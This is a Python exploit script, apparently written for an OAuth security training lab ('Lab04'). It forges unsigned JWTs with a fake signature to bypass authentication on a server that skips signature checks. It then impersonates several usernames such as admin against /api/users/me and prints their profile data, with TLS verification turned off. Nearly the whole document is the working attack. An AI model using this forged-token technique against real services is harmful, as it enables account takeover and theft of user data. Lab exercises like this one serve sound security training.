#!/usr/bin/env python3
"""
Lab04 JWT Exploit - Working version với real client_id
"""

import json
import base64
import requests
import time

# Client ID thực tế từ docker config
REAL_CLIENT_ID = "f20e7e23-0376-4c18-9e05-1f862264a288"

def create_malicious_jwt(username="admin"):
    """Tạo JWT malicious với client_id thực tế"""
    
    # Header - không quan trọng vì server dùng ParseInsecure
    header = {
        "alg": "RS256",
        "typ": "JWT"
    }
    
    # Payload với thông tin cần thiết
    now = int(time.time())
    payload = {
        "iss": "https://server-04.oauth.labs",  # Issuer
        "sub": username,  # Username để impersonate
        "aud": [REAL_CLIENT_ID],  # Audience - phải là client_id có trong DB
        "exp": now + 3600,  # Expiry
        "iat": now,  # Issued at
        "jti": "malicious-jti-123",  # JWT ID
        "scope": "read:profile",  # Required scope
        "client_id": REAL_CLIENT_ID  # Client ID - phải match với audience
    }
    
    # Encode header và payload
    header_encoded = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    payload_encoded = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')
    
    # Fake signature - server sẽ không verify
    signature = "fake_signature_not_verified_by_server"
    
    return f"{header_encoded}.{payload_encoded}.{signature}"

def exploit_users_me_endpoint(username="admin", server_url="https://server-04.oauth.labs"):
    """Exploit endpoint /api/users/me"""
    
    print(f"\n[+] Attempting to exploit /api/users/me for user: {username}")
    
    # Tạo JWT malicious
    malicious_jwt = create_malicious_jwt(username)
    print(f"[+] Created malicious JWT: {malicious_jwt[:60]}...")
    
    # Headers với Authorization Bearer
    headers = {
        "Authorization": f"Bearer {malicious_jwt}",
        "Content-Type": "application/json"
    }
    
    try:
        print(f"[+] Sending GET request to {server_url}/api/users/me")
        response = requests.get(
            f"{server_url}/api/users/me",
            headers=headers,
            verify=False,  # Ignore SSL cho lab environment
            timeout=15
        )
        
        print(f"[+] Response Status: {response.status_code}")
        
        if response.status_code == 200:
            user_data = response.json()
            print(f"[SUCCESS] Exploit thành công!")
            print(f"[SUCCESS] Đã impersonate user '{username}':")
            print(f"          Name: {user_data.get('firstname')} {user_data.get('lastname')}")
            print(f"          Email: {user_data.get('email')}")
            if user_data.get('extra'):
                print(f"          Extra: {user_data.get('extra')}")
            return True
        elif response.status_code == 401:
            print(f"[FAILED] Unauthorized - JWT rejected")
            print(f"         Response: {response.text}")
        elif response.status_code == 404:
            print(f"[INFO] User '{username}' không tồn tại trong database")
        else:
            print(f"[FAILED] Unexpected status: {response.status_code}")
            print(f"         Response: {response.text}")
            
        return False
        
    except requests.exceptions.ConnectionError:
        print(f"[ERROR] Không thể kết nối đến {server_url}")
        print(f"[INFO] Hãy đảm bảo lab04 server đang chạy")
        return False
    except Exception as e:
        print(f"[ERROR] Exception occurred: {e}")
        return False

def main():
    """Main exploit function"""
    print("=" * 60)
    print("Lab04 JWT Signature Bypass Exploit")
    print("=" * 60)
    print("Vulnerability: Server uses jwt.ParseInsecure() - no signature verification")
    print("Impact: Complete authentication bypass, user impersonation")
    print("Target: /api/users/me endpoint")
    print("=" * 60)
    
    # Test với multiple usernames có thể có trong database
    test_usernames = [
        "admin",
        "alice", 
        "bob",
        "user1",
        "test",
        "demo",
        "victim"
    ]
    
    success_count = 0
    
    for username in test_usernames:
        if exploit_users_me_endpoint(username):
            success_count += 1
            # Thành công với user này, có thể tiếp tục test users khác
        
        print("-" * 40)
    
    print(f"\n[SUMMARY] Exploit successful for {success_count} users")
    
    if success_count > 0:
        print("[SUCCESS] JWT signature bypass vulnerability confirmed!")
        print("[IMPACT] Attacker can impersonate any existing user")
    else:
        print("[INFO] No users found or server not accessible")
        print("[DEBUG] Verify lab04 is running and users exist in database")

if __name__ == "__main__":
    main() 